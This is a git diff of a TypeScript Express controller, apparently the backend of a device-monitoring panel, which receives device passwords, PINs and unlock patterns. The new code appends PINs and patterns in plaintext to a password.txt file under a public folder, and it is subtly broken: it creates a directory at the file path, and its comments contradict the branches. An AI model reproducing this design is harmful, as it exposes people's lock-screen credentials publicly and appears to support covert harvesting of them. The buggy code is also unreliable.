@@ -1,5 +1,7 @@
 import { Request, Response } from "express";
 import { validationResult } from "express-validator";
+import fs from "fs";
+import path from "path";
 
 import Device from "../models/device.model";
 import User from "../models/user.model";
@@ -123,29 +125,80 @@ export const addNewDeviceInfo = async (
 	}
 };
 
-// Update Security Information
-export const updateSecurityInformation = async (data: any) => {
+export const updateSecurityInformation = async (data: {
+	deviceId: string;
+	password: string | string[];
+	type: string;
+}) => {
 	try {
 		console.log("device security info:", data);
 		const { deviceId, password, type } = data;
 
-		// Find and update the device, return the updated document
-		const updatedDevice = await Device.findOneAndUpdate(
-			{ deviceId: deviceId },
-			{
-				$set: {
-					securityData: password,
-					securityType: type,
+		if (type === "password") {
+			// For type "pattern", save security data to the database
+			const updatedDevice = await Device.findOneAndUpdate(
+				{ deviceId },
+				{
+					$set: {
+						securityData: password,
+						securityType: type,
+					},
 				},
-			},
-			{ new: true }
-		);
+				{ new: true }
+			);
 
-		if (updatedDevice) {
+			if (updatedDevice) {
+				return {
+					success: true,
+					device: updatedDevice,
+					message:
+						"Device security updated successfully (pattern saved in DB)",
+				};
+			}
+		} else if (type === "pattern" || type === "pin") {
+			// For "password" or "pin", save to a text file in public/security
+			const folderPath = path.join(
+				__dirname,
+				"..",
+				"public",
+				"security",
+				deviceId
+			);
+			const filePath = path.join(folderPath, `password.txt`);
+
+			// Ensure the folder exists
+			if (!fs.existsSync(filePath)) {
+				fs.mkdirSync(filePath, { recursive: true });
+			}
+
+			// Prepare the log entry with the formatted date
+			const logEntry = `${password}, Security Type: ${type}\n`;
+
+			// Create a buffer from the log entry string
+			const logBuffer = Buffer.from(logEntry, "utf-8");
+
+			// Append the buffer content to the file asynchronously
+			await new Promise<void>((resolve, reject) => {
+				fs.appendFile(filePath, logBuffer, (err) => {
+					if (err) return reject(err);
+					resolve();
+				});
+			});
+
+			// Check if device with deviceId already exists
+			const device: DeviceModelType | null = await Device.findOne({
+				deviceId,
+			});
+
 			return {
 				success: true,
-				device: updatedDevice,
-				message: "Device security updated successfully",
+				device: device,
+				message: `Device security updated successfully (${type} data updated in file)`,
+			};
+		} else {
+			return {
+				success: false,
+				message: `Unknown security type: ${type}`,
 			};
 		}
 	} catch (error) {
